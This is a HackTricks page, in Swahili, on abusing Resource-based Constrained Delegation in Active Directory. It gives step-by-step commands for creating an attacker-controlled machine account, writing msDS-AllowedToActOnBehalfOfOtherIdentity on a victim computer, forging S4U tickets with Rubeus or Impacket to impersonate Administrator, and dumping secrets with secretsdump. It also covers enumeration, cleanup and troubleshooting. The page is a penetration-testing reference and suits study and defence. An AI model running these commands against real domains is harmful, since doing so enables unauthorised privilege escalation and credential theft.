# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Misingi ya Resource-based Constrained Delegation

Hii ni sawa na [Constrained Delegation](constrained-delegation.md) ya msingi lakini badala ya kutoa ruhusa kwa **object** ku **impersonate any user against a machine**, Resource-based Constrain Delegation **inaweka** ndani ya **object** ni nani anayeweza **impersonate any user against it**.

Katika kesi hii, object iliyowekwa constraint itakuwa na attribute inaitwa _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ yenye jina la mtumiaji anayeweza kuiga mtumiaji mwingine wowote dhidi yake.

Tofauti nyingine muhimu kutoka kwa Constrained Delegation na delegations nyingine ni kwamba mtumiaji yeyote mwenye **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) anaweza kuweka **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Katika aina nyingine za Delegation ulitakiwa uwe na domain admin privs).

### New Concepts

Nyuma katika Constrained Delegation ilisemwa kwamba flag ya **`TrustedToAuthForDelegation`** ndani ya thamani ya _userAccountControl_ ya mtumiaji inahitajika kufanya **S4U2Self.** Lakini hiyo si sawa kabisa.\
Ukweli ni kwamba hata bila thamani hiyo, unaweza kufanya **S4U2Self** dhidi ya mtumiaji yeyote ikiwa wewe ni **service** (una SPN) lakini, ikiwa **una `TrustedToAuthForDelegation`** TGS iliyorejeshwa itakuwa **Forwardable** na ikiwa **huna** flag hiyo TGS iliyorejeshwa **haita** kuwa **Forwardable**.

Hata hivyo, ikiwa **TGS** inayotumika katika **S4U2Proxy** si **Forwardable** kujaribu kutumia **basic Constrain Delegation** haitafanya kazi. Lakini ikiwa unajaribu kuendeleza udhaifu wa **Resource-Based constrain delegation**, itafanya kazi.

### Muundo wa shambulio

> Kama una **write equivalent privileges** juu ya akaunti ya **Computer** unaweza kupata **privileged access** kwenye mashine hiyo.

Tukimaanisha mshambuliaji tayari ana **write equivalent privileges over the victim computer**.

1. Mshambuliaji anamtumikisha/ana **compromise** akaunti yenye **SPN** au **anaifanya mwenyewe** (“Service A”). Kumbuka kwamba **kila** _Admin User_ bila ruhusa nyingine maalum anaweza **create** hadi 10 Computer objects (**_MachineAccountQuota_**) na kuziweka SPN. Hivyo mshambuliaji anaweza tu kuunda Computer object na kuweka SPN.
2. Mshambuliaji anatumia **abuses its WRITE privilege** juu ya kompyuta ya mwathirika (ServiceB) ili kusanidi **resource-based constrained delegation to allow ServiceA to impersonate any user** dhidi ya kompyuta ya mwathirika (ServiceB).
3. Mshambuliaji anatumia Rubeus kufanya **full S4U attack** (S4U2Self and S4U2Proxy) kutoka Service A kwenda Service B kwa mtumiaji **with privileged access to Service B**.
1. S4U2Self (kutoka kwenye akaunti iliyo compromise/created yenye SPN): Omba **TGS of Administrator to me** (Not Forwardable).
2. S4U2Proxy: Tumia **not Forwardable TGS** ya hatua iliyotangulia kuomba **TGS** kutoka **Administrator** kwenda **victim host**.
3. Hata kama unatumia not Forwardable TGS, kwa vile unachunguza Resource-based constrained delegation, itafanya kazi.
4. Mshambuliaji anaweza **pass-the-ticket** na **impersonate** mtumiaji ili kupata **access to the victim ServiceB**.

Ili kuangalia _**MachineAccountQuota**_ ya domain unaweza kutumia:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Shambulio

### Kuunda Objekti ya Kompyuta

Unaweza kuunda objekti ya kompyuta ndani ya domain ukitumia **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Kusanidi Resource-based Constrained Delegation

**Kutumia activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Kutumia powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Kutekeleza S4U attack kamili (Windows/Rubeus)

Kwanza kabisa, tuliunda Computer object mpya na password `123456`, hivyo tunahitaji hash ya password hiyo:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Hii itaonyesha RC4 na AES hashes za akaunti hiyo.\ Sasa, attack inaweza kufanywa:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Unaweza kuzalisha tiketi za huduma zaidi kwa kuomba mara moja kwa kutumia param `/altservice` ya Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Kumbuka kuwa watumiaji wana sifa iitwayo "**Cannot be delegated**". Ikiwa mtumiaji ana sifa hii ikawa True, hautaweza kujifanya mtumiaji huyo. Sifa hii inaonekana ndani ya bloodhound.

### Zana za Linux: RBCD kutoka mwanzo hadi mwisho na Impacket (2024+)

Ikiwa unafanya kazi kutoka Linux, unaweza kutekeleza mnyororo kamili wa RBCD kwa kutumia zana rasmi za Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Vidokezo
- Ikiwa LDAP signing/LDAPS imewekwa, tumia `impacket-rbcd -use-ldaps ...`.
- Pendelea funguo za AES; domain nyingi za kisasa zinazuia RC4. Impacket na Rubeus zote zinaunga mkono mtiririko wa AES pekee.
- Impacket inaweza kuandika upya `sname` ("AnySPN") kwa baadhi ya zana, lakini upate SPN sahihi kadri inavyowezekana (kwa mfano, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Kufikia

Mstari wa amri wa mwisho utatekeleza **shambulio kamili la S4U na utaingiza TGS** kutoka kwa Administrator kwenye mwenyeji wa mwathirika katika **kumbukumbu**.\
Katika mfano huu ilihitajika TGS kwa huduma ya **CIFS** kutoka kwa Administrator, hivyo utaweza kufikia **C$**:
```bash
ls \\victim.domain.local\C$
```
### Kutumia vibaya tiketi mbalimbali za huduma

Jifunze kuhusu the [**available service tickets here**](silver-ticket.md#available-services).

## Kukusanya, kukagua na kusafisha

### Orodhesha kompyuta zilizo na RBCD imewekwa

PowerShell (kufasiri SD ili kutatua SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (soma au safisha kwa amri moja):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Usafishaji / kuanzisha upya RBCD

- PowerShell (futa sifa):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Makosa ya Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Hii ina maana Kerberos imewekwa ili isitumie DES au RC4 na wewe unatoa tu hash ya RC4. Toa kwa Rubeus angalau hash ya AES256 (au toa rc4, aes128 na aes256 hashes). Mfano: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Hii ina maana saa ya kompyuta ya sasa ni tofauti na ile ya DC na Kerberos haifanyi kazi ipasavyo.
- **`preauth_failed`**: Hii ina maana jina la mtumiaji + hashes ulizotoa hazifanyi kazi kuingia. Huenda umesahau kuweka "$" ndani ya jina la mtumiaji wakati wa kuunda hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Hii inaweza kumaanisha:
  - Mtumiaji unayejaribu kuiga hawezi kupata huduma inayotakiwa (kwa sababu huwezi kuiga au kwa sababu hana vibali vya kutosha)
  - Huduma uliyoomba haipo (ikiwa unaomba tiketi kwa winrm lakini winrm haifanyi kazi)
  - fakecomputer iliyoundwa imepoteza vibali vyake juu ya server iliyo hatarini na unahitaji kuirudishia
  - Unatumia KCD ya kawaida; kumbuka RBCD inafanya kazi na tiketi za S4U2Self zisizoweza kuhamishwa (non-forwardable), wakati KCD inahitaji forwardable.

## Vidokezo, relay na mbadala

- Unaweza pia kuandika RBCD SD kupitia AD Web Services (ADWS) ikiwa LDAP imechujwa. Angalia:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Minyororo ya Kerberos relay mara nyingi hufikia mwisho kwa RBCD ili kupata SYSTEM ya mlocal kwa hatua moja. Tazama mifano ya vitendo kutoka mwanzo hadi mwisho:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ikiwa LDAP signing/channel binding vimezimwa na unaweza kuunda akaunti ya mashine, zana kama **KrbRelayUp** zinaweza kurelay uthibitisho wa Kerberos ulioshinikizwa kwa LDAP, kuweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kwa akaunti yako ya mashine kwenye object ya kompyuta lengwa, na mara moja kuiga **Administrator** kupitia S4U kutoka off-host.

## Marejeo

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (rasmi): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Cheatsheet fupi ya Linux yenye sintaksia ya hivi karibuni: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
